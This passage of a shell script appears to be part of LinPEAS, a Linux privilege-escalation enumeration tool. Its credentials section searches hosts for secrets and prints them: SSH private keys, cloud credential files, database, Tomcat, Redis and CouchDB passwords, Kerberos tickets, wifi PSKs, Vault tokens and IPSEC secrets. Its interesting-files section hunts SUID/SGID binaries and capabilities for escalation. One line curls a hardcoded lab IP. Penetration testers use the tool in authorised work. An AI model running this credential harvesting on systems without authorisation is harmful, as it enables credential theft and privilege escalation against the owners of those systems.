    for f in $drup; do grep "drupal_hash_salt\|'database'\|'username'\|'password'\|'host'\|'port'\|'driver'\|'prefix'" $f 2>/dev/null | sed "s,.*,${C}[1;31m&${C}[0m,"; done
  else echo_not_found "/default/settings.php"
  fi
  echo ""

  #-- 11SI) Tomcat users
  printf $Y"[+] "$GREEN"Searching Tomcat users file\n"$NC
  tomcat=$(echo "$FIND_VAR $FIND_ETC $FIND_HOME $FIND_ROOT $FIND_TMP $FIND_USR $FIND_OPT" | grep -E 'tomcat-users\.xml$')
  if [ "$tomcat" ]; then
    echo "tomcat-users.xml file found: $tomcat"
    for f in $tomcat; do grep "username=" "$f" 2>/dev/null | grep "password=" | sed "s,.*,${C}[1;31m&${C}[0m,"; done
  else echo_not_found "tomcat-users.xml"
  fi
  echo ""

  #-- 12SI) Mongo Information
  printf $Y"[+] "$GREEN"Mongo information\n"$NC
  mongos=$(echo "$FIND_VAR $FIND_ETC $FIND_HOME $FIND_ROOT $FIND_TMP $FIND_USR $FIND_OPT" | grep -E 'mongod.*\.conf$')
  (mongo --version 2>/dev/null || mongod --version 2>/dev/null) || echo_not_found
  for f in $mongos; do
    echo "Found $f"
    cat "$f" | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null | grep -v "^$" | sed "s,auth*=*true\|pass.*,${C}[1;31m&${C}[0m," 2>/dev/null
  done

  #TODO: Check if you can login without password and warn the user
  echo ""

  #-- 13SI) Supervisord conf file
  printf $Y"[+] "$GREEN"Searching supervisord configuration file\n"$NC
  supervisor=$(echo "$FIND_VAR $FIND_ETC $FIND_HOME $FIND_ROOT $FIND_TMP $FIND_USR $FIND_OPT" | grep -E 'supervisord\.conf')
  if [ "$supervisor" ]; then
    printf "$supervisor\n"
    for f in $supervisor; do cat "$f" 2>/dev/null | grep "port.*=\|username.*=\|password=.*" | sed "s,port\|username\|password,${C}[1;31m&${C}[0m,"; done
  else echo_not_found "supervisord.conf"
  fi
  echo ""

  #-- 14SI) Cesi conf file
  cesi=$(echo "$FIND_VAR $FIND_ETC $FIND_HOME $FIND_ROOT $FIND_TMP $FIND_USR $FIND_OPT" | grep -E 'cesi\.conf')
  printf $Y"[+] "$GREEN"Searching cesi configuration file\n"$NC
  if [ "$cesi" ]; then
    printf "$cesi\n"
    for f in $cesi; do cat "$f" 2>/dev/null | grep "username.*=\|password.*=\|host.*=\|port.*=\|database.*=" | sed "s,username\|password\|database,${C}[1;31m&${C}[0m,"; done
  else echo_not_found "cesi.conf"
  fi
  echo ""

  #-- 15SI) Rsyncd conf file
  rsyncd=$(echo "$FIND_VAR $FIND_ETC $FIND_HOME $FIND_ROOT $FIND_TMP $FIND_USR $FIND_OPT" | grep -E 'rsyncd\.conf|rsyncd\.secrets')
  printf $Y"[+] "$GREEN"Searching Rsyncd config file\n"$NC
  if [ "$rsyncd" ]; then
    for f in $rsyncd; do 
      printf "$f\n"
      if [ `echo "$f" | grep -i "secrets"` ]; then
        cat "$f" 2>/dev/null | sed "s,.*,${C}[1;31m&${C}[0m,"
      else
        cat "$f" 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null | grep -v "^$" | sed "s,secrets.*\|auth.*users.*=,${C}[1;31m&${C}[0m,"
      fi
      echo ""
    done
  else echo_not_found "rsyncd.conf"
  fi

  ##-- 16SI) Hostapd conf file
  printf $Y"[+] "$GREEN"Searching Hostapd config file\n"$NC
  hostapd=$(echo "$FIND_VAR $FIND_ETC $FIND_HOME $FIND_ROOT $FIND_TMP $FIND_USR $FIND_OPT" | grep -E 'hostapd\.conf')
  if [ "$hostapd" ]; then
    printf $Y"[+] "$GREEN"Hostapd conf was found\n"$NC
    printf "$hostapd\n"
    for f in $hostapd; do cat "$f" 2>/dev/null | grep "passphrase" | sed "s,passphrase.*,${C}[1;31m&${C}[0m,"; done
  else echo_not_found "hostapd.conf"
  fi
  echo ""

  ##-- 17SI) Wifi conns
  printf $Y"[+] "$GREEN"Searching wifi conns file\n"$NC
  wifi=`find /etc/NetworkManager/system-connections/ 2>/dev/null`
  if [ "$wifi" ]; then
    printf "$wifi\n"
    for f in $wifi; do cat "$f" 2>/dev/null | grep "psk.*=" | sed "s,psk.*,${C}[1;31m&${C}[0m,"; done
  else echo_not_found
  fi
  echo ""

  ##-- 18SI) Anaconda-ks conf files
  printf $Y"[+] "$GREEN"Searching Anaconda-ks config files\n"$NC
  anaconda=$(echo "$FIND_VAR $FIND_ETC $FIND_HOME $FIND_ROOT $FIND_TMP $FIND_USR $FIND_OPT" | grep -E 'anaconda-ks\.cfg')
  if [ "$anaconda" ]; then
    printf "$anaconda\n"
    for f in $anaconda; do cat "$f" 2>/dev/null | grep "rootpw" | sed "s,rootpw.*,${C}[1;31m&${C}[0m,"; done
  else echo_not_found "anaconda-ks.cfg"
  fi
  echo ""

  ##-- 19SI) VNC files
  printf $Y"[+] "$GREEN"Searching .vnc directories and their passwd files\n"$NC
  vnc=$(echo "$FIND_DIR_HOME $FIND_DIR_ROOT " | grep -E '\.vnc')
  if [ "$vnc" ]; then
    printf "$vnc\n"
    for d in $vnc; do find "$d" -name "passwd" -exec ls -l {} \; 2>/dev/null | sed "s,.*,${C}[1;31m&${C}[0m,"; done
  else echo_not_found ".vnc"
  fi
  echo ""

  ##-- 20SI) LDAP directories
  printf $Y"[+] "$GREEN"Searching ldap directories and their hashes\n"$NC
  ldap=$(echo "$FIND_DIR_VAR $FIND_DIR_ETC $FIND_DIR_HOME $FIND_DIR_ROOT $FIND_DIR_TMP $FIND_DIR_USR $FIND_DIR_OPT" | grep -E 'ldap$')
  if [ "$ldap" ]; then
    printf "$ldap\n"
    echo "The password hash is from the {SSHA} to 'structural'";
    for d in $ldap; do cat "$d/*.bdb" 2>/dev/null | grep -i -a -E -o "description.*" | sort | uniq | sed "s,administrator\|password\|ADMINISTRATOR\|PASSWORD\|Password\|Administrator,${C}[1;31m&${C}[0m,g"; done
  else echo_not_found "ldap"
  fi
  echo ""

  ##-- 21SI) .ovpn files
  printf $Y"[+] "$GREEN"Searching .ovpn files and credentials\n"$NC
  ovpn=$(echo "$FIND_ETC $FIND_USR $FIND_HOME $FIND_ROOT" | grep -E '\.ovpn')
  if [ "$ovpn" ]; then
    printf "$ovpn\n"
    for f in $ovpn; do cat "$f" 2>/dev/null | grep "auth-user-pass" | sed "s,auth-user-pass.*,${C}[1;31m&${C}[0m,"; done
  else echo_not_found ".ovpn"
  fi
  echo ""

  ##-- 22SI) ssh files
  printf $Y"[+] "$GREEN"Searching ssl/ssh files\n"$NC
  ssh=$(echo "$FIND_VAR $FIND_ETC $FIND_HOME $FIND_ROOT $FIND_MNT $FIND_USR $FIND_OPT" | grep -E 'id_dsa.*|id_rsa.*|known_hosts|authorized_hosts|authorized_keys')
  certsb4=$(echo "$FIND_VAR $FIND_ETC $FIND_HOME $FIND_ROOT $FIND_MNT $FIND_USR $FIND_OPT" | grep -E '.*\.pem|.*\.cer|.*\.crt' | grep -E -v '^/usr/share/.*' | grep -E -v '^/etc/ssl/.*' | grep -E -v '^/usr/local/lib/.*' | grep -E -v '^/usr/lib.*')
  if [ "$certsb4" ]; then certsb4_grep=`grep -L "\"\|'\|(" $certsb4 2>/dev/null`; fi
  certsbin=$(echo "$FIND_VAR $FIND_ETC $FIND_HOME $FIND_ROOT $FIND_MNT $FIND_USR $FIND_OPT" | grep -E '.*\.csr|.*\.der' | grep -E -v '^/usr/share/.*' | grep -E -v '^/etc/ssl/.*' | grep -E -v '^/usr/local/lib/.*' | grep -E -v '^/usr/lib/.*')
  clientcert=$(echo "$FIND_VAR $FIND_ETC $FIND_HOME $FIND_ROOT $FIND_MNT $FIND_USR $FIND_OPT" | grep -E '.*\.pfx|.*\.p12' | grep -E -v '^/usr/share/.*' | grep -E -v '^/etc/ssl/.*' | grep -E -v '^/usr/local/lib/.*' | grep -E -v '^/usr/lib/.*')
  sshagents=$(echo "$FIND_TMP" | grep -E 'agent.*')
  homesshconfig=$(echo "$FIND_HOME $FIND_ROOT" | grep -E 'config' | grep "ssh")
  sshconfig="`ls /etc/ssh/ssh_config 2>/dev/null`"
  hostsdenied="`ls /etc/hosts.denied 2>/dev/null`"
  hostsallow="`ls /etc/hosts.allow 2>/dev/null`"

  if [ "$ssh"  ]; then
    printf "$ssh\n"
  fi

  grep "PermitRootLogin \|ChallengeResponseAuthentication \|PasswordAuthentication \|UsePAM \|Port\|PermitEmptyPasswords\|PubkeyAuthentication\|ListenAddress\|ForwardAgent\|AllowAgentForwarding\|AuthorizedKeysFiles" /etc/ssh/sshd_config 2>/dev/null | grep -v "#" | sed "s,PermitRootLogin.*es\|PermitEmptyPasswords.*es\|ChallengeResponseAuthentication.*es\|FordwardAgent.*es,${C}[1;31m&${C}[0m,"

  if [ "$TIMEOUT" ]; then
    privatekeyfilesetc=`timeout 40 grep -rl '\-\-\-\-\-BEGIN .* PRIVATE KEY.*\-\-\-\-\-' /etc 2>/dev/null`
    privatekeyfileshome=`timeout 40 grep -rl '\-\-\-\-\-BEGIN .* PRIVATE KEY.*\-\-\-\-\-' /home 2>/dev/null`
    privatekeyfilesroot=`timeout 40 grep -rl '\-\-\-\-\-BEGIN .* PRIVATE KEY.*\-\-\-\-\-' /root 2>/dev/null`
    privatekeyfilesmnt=`timeout 40 grep -rl '\-\-\-\-\-BEGIN .* PRIVATE KEY.*\-\-\-\-\-' /mnt 2>/dev/null`
  else
    privatekeyfilesetc=`grep -rl '\-\-\-\-\-BEGIN .* PRIVATE KEY.*\-\-\-\-\-' /etc 2>/dev/null` #If there is tons of files linpeas gets frozen here without a timeout
    privatekeyfileshome=`grep -rl '\-\-\-\-\-BEGIN .* PRIVATE KEY.*\-\-\-\-\-' $HOME/.ssh 2>/dev/null`
  fi
    
  if [ "$privatekeyfilesetc" ] || [ "$privatekeyfileshome" ] || [ "$privatekeyfilesroot" ] || [ "$privatekeyfilesmnt" ] ; then
    printf "Possible private SSH keys were found!\n" | sed "s,.*,${C}[1;31m&${C}[0m,"
    if [ "$privatekeyfilesetc" ]; then printf "$privatekeyfilesetc\n" | sed "s,.*,${C}[1;31m&${C}[0m,"; fi
    if [ "$privatekeyfileshome" ]; then printf "$privatekeyfileshome\n" | sed "s,.*,${C}[1;31m&${C}[0m,"; fi
    if [ "$privatekeyfilesroot" ]; then printf "$privatekeyfilesroot\n" | sed "s,.*,${C}[1;31m&${C}[0m,"; fi
    if [ "$privatekeyfilesmnt" ]; then printf "$privatekeyfilesmnt\n" | sed "s,.*,${C}[1;31m&${C}[0m,"; fi
  fi
  if [ "$certsb4_grep" ] || [ "$certsbin" ]; then
    echo "  --> Some certificates were found (out limited):"
    printf "$certsb4_grep\n" | head -n 20
    printf "$certsbin\n" | head -n 20
  fi
  if [ "$clientcert" ]; then
    echo "  --> Some client certificates were found:"
    printf "$clientcert\n"
  fi
  if [ "$sshagents" ]; then
    echo "  --> Some SSH Agent files were found:"
    printf "$sshagents\n"
  fi
  if [ "`ssh-add -l 2>/dev/null | grep -v 'no identities'`" ]; then
    echo "  --> SSH Agents listed:"
    ssh-add -l
  fi
  if [ "$homesshconfig" ]; then
    echo " --> Some home ssh config file was found"
    printf "$homesshconfig\n"
    for f in $homesshconfig; do cat $f 2>/dev/null | grep -v "^$" | sed "s,User\|ProxyCommand\|P,${C}[1;31m&${C}[0m,"; done
  fi
  if [ "$hostsdenied" ]; then
    echo " --> /etc/hosts.denied file found, read the rules:"
    printf "$homesshconfig\n"
    cat "/etc/hosts.denied" 2>/dev/null | grep -v "#" | grep -v "^$" | sed "s,.*,${C}[1;32m&${C}[0m,"
    echo ""
  fi
  if [ "$hostsallow" ]; then
    echo " --> /etc/hosts.allow file found, read the rules:"
    printf "$homesshconfig\n"
    cat "/etc/hosts.allow" 2>/dev/null | grep -v "#" | grep -v "^$" | sed "s,.*,${C}[1;31m&${C}[0m,"
    echo ""
  fi
  if [ "$sshconfig" ]; then
    echo ""
    echo "Searching inside /etc/ssh/ssh_config for interesting info"
    cat /etc/ssh/ssh_config 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null | grep -v "^$" | sed "s,Host\|ForwardAgent\|User\|ProxyCommand,${C}[1;31m&${C}[0m,"
  fi
  echo ""

  ##-- 23SI) PAM auth
  printf $Y"[+] "$GREEN"Searching unexpected auth lines in /etc/pam.d/sshd\n"$NC
  pamssh=`cat /etc/pam.d/sshd 2>/dev/null | grep -v "^#\|^@" | grep -i auth`
  if [ "$pamssh" ]; then
    cat /etc/pam.d/sshd 2>/dev/null | grep -v "^#\|^@" | grep -i auth | sed "s,.*,${C}[1;31m&${C}[0m,"
  else echo_no
  fi
  echo ""

  ##-- 24SI) Cloud keys
  printf $Y"[+] "$GREEN"Searching Cloud credentials (AWS, Azure, GC)\n"$NC
  cloudcreds=$(echo "$FIND_VAR $FIND_ETC $FIND_HOME $FIND_ROOT $FIND_TMP $FIND_USR $FIND_OPT" | grep -E 'credentials$|credentials\.db$|legacy_credentials\.db$|access_tokens\.db$|accessTokens\.json$|azureProfile\.json$')
  if [ "$cloudcreds" ]; then
    for f in $cloudcreds; do 
      if [ -f "$f" ]; then #Check if file, here we only look for filenames, not dirs
        printf "Reading $f\n" | sed "s,credentials\|credentials.db\|legacy_credentials.db\|access_tokens.db\|accessTokens.json\|azureProfile.json,${C}[1;31m&${C}[0m,g"
        cat "$f" 2>/dev/null | sed "s,.*,${C}[1;31m&${C}[0m,g"
        echo ""
      fi
    done
  fi
  echo ""

  ##-- 25SI) NFS exports
  printf $Y"[+] "$GREEN"NFS exports?\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe\n"$NC
  if [ "`cat /etc/exports 2>/dev/null`" ]; then cat /etc/exports 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null | sed "s,no_root_squash\|no_all_squash ,${C}[1;31;103m&${C}[0m,"
  else echo_not_found "/etc/exports"
  fi
  echo ""

  ##-- 26SI) Kerberos
  printf $Y"[+] "$GREEN"Searching kerberos conf files and tickets\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt\n"$NC
  krb5=$(echo "$FIND_DIR_VAR $FIND_DIR_ETC $FIND_DIR_HOME $FIND_DIR_ROOT $FIND_DIR_TMP $FIND_DIR_USR $FIND_DIR_OPT" | grep -E 'krb5\.conf')
  if [ "$krb5" ]; then
    for f in $krb5; do cat "$f" 2>/dev/null | grep default_ccache_name | sed "s,default_ccache_name,${C}[1;31m&${C}[0m,"; done
  else echo_not_found "krb5.conf"
  fi
  ls -l "/tmp/krb5cc*" "/var/lib/sss/db/ccache_*" "/etc/opt/quest/vas/host.keytab" 2>/dev/null || echo_not_found "tickets kerberos"
  klist 2>/dev/null || echo_not_found "klist"
  echo ""

  ##-- 27SI) kibana
  printf $Y"[+] "$GREEN"Searching Kibana yaml\n"$NC
  kibana=$(echo "$FIND_VAR $FIND_ETC $FIND_HOME $FIND_ROOT $FIND_TMP $FIND_USR $FIND_OPT" | grep -E 'kibana\.y.*ml')
  if [ "$kibana" ]; then
    printf "$kibana\n"
    for f in $kibana; do cat "$f" 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null | grep -v "^$" | grep -v -e '^[[:space:]]*$' | sed "s,username\|password\|host\|port\|elasticsearch\|ssl,${C}[1;31m&${C}[0m,"; done
  else echo_not_found "kibana.yml"
  fi
  echo ""

  ##-- 28SI) Knock
  printf $Y"[+] "$GREEN"Searching Knock configuration\n"$NC
  Knock=$(echo "$FIND_ETC" | grep -E '/etc/init.d/.*knockd.*')
  if [ "$Knock" ]; then
   for f in $Knock; do
     h=$(grep -R -i "defaults_file=" $f | cut -b 15-) ##Search string to know where is the default knock file - example - DEFAULTS_FILE=/etc/default/knockd
     i=$(grep -R -i "please edit" $h | awk '{print $4}') ##Search string to know where is config file - example - # PLEASE EDIT /etc/knockd.conf BEFORE ENABLING
     j=$(grep -R -i "sequence" $i) ##If we want we can show sequence number - 'hidded'
     printf "Config Knock file found!: \n$i\n" | sed "s,.*,${C}[1;31m&${C}[0m,"
     printf " Sequence found!: \n$j\n" | sed "s,.*,${C}[1;31m&${C}[0m,"
    done
  else echo_not_found "Knock.config"
  fi
  echo ""

  ###-- 29SI) Logstash
  printf $Y"[+] "$GREEN"Searching logstash files\n"$NC
  logstash=$(echo "$FIND_DIR_VAR $FIND_DIR_ETC $FIND_DIR_HOME $FIND_DIR_ROOT $FIND_DIR_TMP $FIND_DIR_USR $FIND_DIR_OPT" | grep -E 'logstash')
  if [ "$logstash" ]; then
    printf "$logstash\n"
    for d in $logstash; do
      if [ -r "$d/startup.options" ]; then 
        echo "Logstash is running as user:"
        cat "$d/startup.options" 2>/dev/null | grep "LS_USER\|LS_GROUP" | sed "s,$sh_usrs,${C}[1;96m&${C}[0m," | sed "s,$nosh_usrs,${C}[1;34m&${C}[0m," | sed "s,$knw_usrs,${C}[1;32m&${C}[0m," | sed "s,$USER,${C}[1;95m&${C}[0m," | sed "s,root,${C}[1;31m&${C}[0m,"
      fi
      cat "$d/conf.d/out*" | grep "exec\s*{\|command\s*=>" | sed "s,exec\s*{\|command\s*=>,${C}[1;31m&${C}[0m,"
      cat "$d/conf.d/filt*" | grep "path\s*=>\|code\s*=>\|ruby\s*{" | sed "s,path\s*=>\|code\s*=>\|ruby\s*{,${C}[1;31m&${C}[0m,"
    done
  else echo_not_found
  fi
  echo ""

  ##-- 30SI) Elasticsearch
  printf $Y"[+] "$GREEN"Searching elasticsearch files\n"$NC
  elasticsearch=$(echo "$FIND_VAR $FIND_ETC $FIND_HOME $FIND_ROOT $FIND_TMP $FIND_USR $FIND_OPT" | grep -E 'elasticsearch\.y.*ml')
  if [ "$elasticsearch" ]; then
    printf "$elasticsearch\n"
    for f in $elasticsearch; do cat $f 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null | grep -v -e '^[[:space:]]*$' | grep "path.data\|path.logs\|cluster.name\|node.name\|network.host\|discovery.zen.ping.unicast.hosts"; done
    echo "Version: $(curl -X GET '10.10.10.115:9200' 2>/dev/null | grep number | cut -d ':' -f 2)"
  else echo_not_found
  fi
  echo ""

  ##-- 31SI) Vault-ssh
  printf $Y"[+] "$GREEN"Searching Vault-ssh files\n"$NC
  vaultssh=$(echo "$FIND_ETC $FIND_USR $FIND_HOME $FIND_ROOT" | grep -E 'vault-ssh-helper\.hcl')
  if [ "$vaultssh" ]; then
    printf "$vaultssh\n"
    for f in $vaultssh; do cat $f 2>/dev/null; vault-ssh-helper -verify-only -config $f 2>/dev/null; done
    echo ""
    vault secrets list 2>/dev/null
    echo "$FIND_ETC $FIND_USR $FIND_HOME $FIND_ROOT" | grep -E '\.vault-token' | sed "s,.*,${C}[1;31m&${C}[0m," 2>/dev/null
  else echo_not_found "vault-ssh-helper.hcl"
  fi
  echo ""

  ##-- 32SI) Cached AD Hashes
  adhashes=`ls "/var/lib/samba/private/secrets.tdb" "/var/lib/samba/passdb.tdb" "/var/opt/quest/vas/authcache/vas_auth.vdb" "/var/lib/sss/db/cache_*" 2>/dev/null`
  printf $Y"[+] "$GREEN"Searching AD cached hashes\n"$NC
  if [ "$adhashes" ]; then
    ls -l "/var/lib/samba/private/secrets.tdb" "/var/lib/samba/passdb.tdb" "/var/opt/quest/vas/authcache/vas_auth.vdb" "/var/lib/sss/db/cache_*" 2>/dev/null
  else echo_not_found "cached hashes"
  fi
  echo ""

  ##-- 33SI) Screen sessions
  printf $Y"[+] "$GREEN"Searching screen sessions\n"$N
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions\n"$NC
  screensess=`screen -ls 2>/dev/null`
  if [ "$screensess" ]; then
    printf "$screensess" | sed "s,.*,${C}[1;31m&${C}[0m," | sed "s,No Sockets found.*,${C}[32m&${C}[0m,"
  else echo_not_found "screen"
  fi
  echo ""

  ##-- 34SI) Tmux sessions
  tmuxdefsess=`tmux ls 2>/dev/null`
  tmuxnondefsess=`ps aux | grep "tmux " | grep -v grep`
  printf $Y"[+] "$GREEN"Searching tmux sessions\n"$N
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions\n"$NC
  if [ "$tmuxdefsess" ] || [ "$tmuxnondefsess" ]; then
    printf "$tmuxdefsess\n$tmuxnondefsess\n" | sed "s,.*,${C}[1;31m&${C}[0m," | sed "s,no server running on.*,${C}[32m&${C}[0m,"
  else echo_not_found "tmux"
  fi
  echo ""

  ##-- 35SI) Couchdb
  printf $Y"[+] "$GREEN"Searching Couchdb directory\n"$NC
  couchdb_dirs=$(echo "$FIND_DIR_VAR $FIND_DIR_ETC $FIND_DIR_HOME $FIND_DIR_ROOT $FIND_DIR_TMP $FIND_DIR_USR $FIND_DIR_OPT" | grep -E 'couchdb')
  for d in $couchdb_dirs; do
    local_inis=`find $d -name local.ini 2>/dev/null`;
    for f in $local_inis; do
      if [ -r "$f" ]; then 
        echo "Found readable $f"
        cat "$f" | grep -v "^;" | grep -v "^$" | sed "s,admin.*\|password.*\|cert_file.*\|key_file.*\|hashed.*\|pbkdf2.*,${C}[1;31m&${C}[0m," 2>/dev/null
      fi
    done
  done
  echo ""

  ##-- 36SI) Redis
  printf $Y"[+] "$GREEN"Searching redis.conf\n"$NC
  redisconfs=$(echo "$FIND_VAR $FIND_ETC $FIND_HOME $FIND_ROOT $FIND_TMP $FIND_USR $FIND_OPT" | grep -E 'redis\.conf$')
  for f in $redisconfs; do
    if [ -r "$f" ]; then 
      echo "Found readable $f"
      cat "$f" | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null | grep -v "^$" | sed "s,masterauth.*\|requirepass.*,${C}[1;31m&${C}[0m," 2>/dev/null
    fi
  done
  echo ""

  ##-- 37SI) Dovecot
  # Needs testing
  printf $Y"[+] "$GREEN"Searching dovecot files\n"$NC
  dovecotpass=$(grep -r "PLAIN" /etc/dovecot 2>/dev/null)
	if [ -z "$dopas" ]; then 
    echo_not_found "dovecot credentials"
  else
	  for d in $dopas; do
      df=$(echo $d |cut -d ':' -f1)
      dp=$(echo $d |cut -d ':' -f2-)
      echo "Found possible PLAIN text creds in $df"
      echo "$dp" | sed "s,.*,${C}[1;31m&${C}[0m," 2>/dev/null
	  done
	fi
  echo ""

  ##-- 38SI) Mosquitto
  printf $Y"[+] "$GREEN"Searching mosquitto.conf\n"$NC
  mqttconfs=$(echo "$FIND_VAR $FIND_ETC $FIND_HOME $FIND_ROOT $FIND_TMP $FIND_USR $FIND_OPT" | grep -E 'mosquitto\.conf$')
  for f in $mqttconfs; do
    if [ -r "$f" ]; then 
      echo "Found readable $f"
      cat "$f" | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null | grep -v "^$" | sed "s,password_file.*\|psk_file.*\|allow_anonymous.*true\|auth,${C}[1;31m&${C}[0m," 2>/dev/null
    fi
  done
  echo ""

  ##-- 39SI) Neo4j
  printf $Y"[+] "$GREEN"Searching neo4j auth file\n"$NC
  neo4j=$(echo "$FIND_DIR_VAR $FIND_DIR_ETC $FIND_DIR_HOME $FIND_DIR_ROOT $FIND_DIR_TMP $FIND_DIR_USR $FIND_DIR_OPT" | grep -E 'neo4j')
  for d in $neo4j; do
    if [ -r "$d" ]; then 
      echo "Found readable $d"
      find $d -type f -name "auth" -exec cat {} \; 2>/dev/null | sed "s,.*,${C}[1;31m&${C}[0m," 2>/dev/null
    fi
  done
  echo ""

  ##-- 40SI) Cloud-Init
  printf $Y"[+] "$GREEN"Searching Cloud-Init conf file\n"$NC
  cloudcfg=$(echo "$FIND_VAR $FIND_ETC $FIND_HOME $FIND_ROOT $FIND_TMP $FIND_USR $FIND_OPT" | grep -E 'cloud\.cfg$')
  for f in $cloudcfg; do
    if [ -r "$f" ]; then 
      echo "Found readable $f"
      cat "$f" | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null | grep -v "^$" | grep "consumer_key\|token_key\|token_secret\|metadata_url\|username:\|password:\|passwd:\|PRIVATE KEY\|PRIVATE KEY\|encrypted_data_bag_secret\|sudo\|_proxy" | sed "s,consumer_key\|token_key\|token_secret\|metadata_url\|password:\|[^_]passwd:\|PRIVATE KEY\|PRIVATE KEY\|encrypted_data_bag_secret\|_proxy,${C}[1;31m&${C}[0m,"
    fi
  done
  echo ""

  ##-- SI) Erlang
  printf $Y"[+] "$GREEN"Searching Erlang cookie file\n"$NC
  erlangcoo=$(echo "$FIND_ETC $FIND_HOME $FIND_ROOT $FIND_USR $FIND_VAR" | grep -E '.erlang.cookie$')
  for f in $erlangcoo; do
    if [ -r "$f" ]; then 
      echo "Found Erlang cookie: $f"
      cat "$f" 2>/dev/null | sed "s,.*,${C}[1;31m&${C}[0m,"
    fi
  done
  echo ""

  ##-- SI) GVM
  printf $Y"[+] "$GREEN"Searching GVM auth file\n"$NC
  gvmconfs=$(echo "$FIND_HOME $FIND_ETC $FIND_ROOT $FIND_TMP $FIND_OTP $FIND_USR" | grep -E 'gvm-tools\.conf')
  for f in $gvmconfs; do
    if [ -r "$f" ]; then 
      echo "Found GVM auth file: $f"
      cat "$f" 2>/dev/null | sed "s,username.*\|password.*,${C}[1;31m&${C}[0m,"
    fi
  done
  echo ""

  IPSEC_RELEVANT_NAMES="ipsec.secrets ipsec.conf"


  ##-- SI) IPSEC
  printf $Y"[+] "$GREEN"Searching IPSEC files\n"$NC
  ipsecconfs=$(echo "$FIND_HOME $FIND_ETC $FIND_ROOT $FIND_TMP $FIND_OTP $FIND_USR" | grep -E 'ipsec\.secrets|ipsec\.conf')
  for f in $ipsecconfs; do
    if [ -r "$f" ]; then 
      echo "Found IPSEC file: $f"
      cat "$f" 2>/dev/null | sed "s,.*PSK.*\|.*RSA.*\|.*EAP =.*\|.*XAUTH.*,${C}[1;31m&${C}[0m,"
    fi
  done
  echo ""
  echo ""

  if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi
fi


if [ "`echo $CHECKS | grep IntFiles`" ]; then
  ###########################################
  #----------) Interesting files (----------#
  ###########################################
  printf $B"====================================( "$GREEN"Interesting Files"$B" )=====================================\n"$NC

  ##-- 1IF) SUID
  printf $Y"[+] "$GREEN"SUID - Check easy privesc, exploits and write perms\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands\n"$NC
  for s in `find / -perm -4000 2>/dev/null`; do
    if [ -O "$s" ]; then
      echo "You own the SUID file: $s" | sed "s,.*,${C}[1;31m&${C}[0m,"
    elif [ -w "$s" ]; then #If write permision, win found (no check exploits)
      echo "You can write SUID file: $s" | sed "s,.*,${C}[1;31;103m&${C}[0m,"
    else
      c="a"
      for b in $sidB; do
        if [ "`echo $s | grep $(echo $b | cut -d "%" -f 1)`" ]; then
          echo $s | sed "s,$(echo $b | cut -d "%" -f 1),${C}[1;31m&\t\t--->\t$(echo $b | cut -d "%" -f 2)${C}[0m,"
          c=""
          break;
        fi
      done;
      if [ "$c" ]; then
        echo $s | sed "s,$sidG,${C}[1;32m&${C}[0m," | sed "s,$sidVB,${C}[1;31;103m&${C}[0m,"
      fi
    fi
  done;
  echo ""

  ##-- 2IF) SGID
  printf $Y"[+] "$GREEN"SGID\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands\n"$NC
  for s in `find / -perm -g=s -type f 2>/dev/null`; do
    if [ -w $s ]; then #If write permision, win found (no check exploits)
      echo "You can write SUID file: $s" | sed "s,.*,${C}[1;31;103m&${C}[0m,"
    else
      c="a"
      for b in $sidB; do
        if [ "`echo $s | grep $(echo $b | cut -d "%" -f 1)`" ]; then
          echo $s | sed "s,$(echo $b | cut -d "%" -f 1),${C}[1;31m&\t\t--->\t$(echo $b | cut -d "%" -f 2)${C}[0m,"
          c=""
          break;
        fi
      done;
      if [ "$c" ]; then
        echo $s | sed "s,$sidG,${C}[1;32m&${C}[0m," | sed "s,$sidVB,${C}[1;31;103m&${C}[0m,"
      fi
    fi
  done;
  echo ""

  ##-- 3IF) Misconfigured /etc/ld.so.conf.d/
  printf $Y"[+] "$GREEN"Writable folders configured in /etc/ld.so.conf.d/\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#etc-ld-so-conf-d\n"$NC
  (cat /etc/ld.so.conf.d/* 2>/dev/null | grep -v "#" | sed "s,$ldsoconfdG,${C}[1;32m&${C}[0m," | sed "s,$Wfolders,${C}[1;31;103m&${C}[0m,g") || echo_not_found
  echo ""

  ##-- 4IF) Capabilities
  printf $Y"[+] "$GREEN"Capabilities\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities\n"$NC
  (getcap -r / 2>/dev/null | sed "s,$sudocapsB,${C}[1;31m&${C}[0m," | sed "s,$capsB,${C}[1;31m&${C}[0m,") || echo_not_found
  echo ""

  ##-- 5IF) Users with capabilities
  printf $Y"[+] "$GREEN"Users with capabilities\n"$NC
  if [ -f "/etc/security/capability.conf" ]; then
    grep -v '^#\|none\|^$' /etc/security/capability.conf 2>/dev/null | sed "s,$sh_usrs,${C}[1;96m&${C}[0m," | sed "s,$nosh_usrs,${C}[1;34m&${C}[0m," | sed "s,$knw_usrs,${C}[1;32m&${C}[0m," | sed "s,$USER,${C}[1;31m&${C}[0m,"
  else echo_not_found "/etc/security/capability.conf"
  fi
  echo ""

  ##-- 5IF) Files with ACLs
  printf $Y"[+] "$GREEN"Files with ACLs\n"$NC
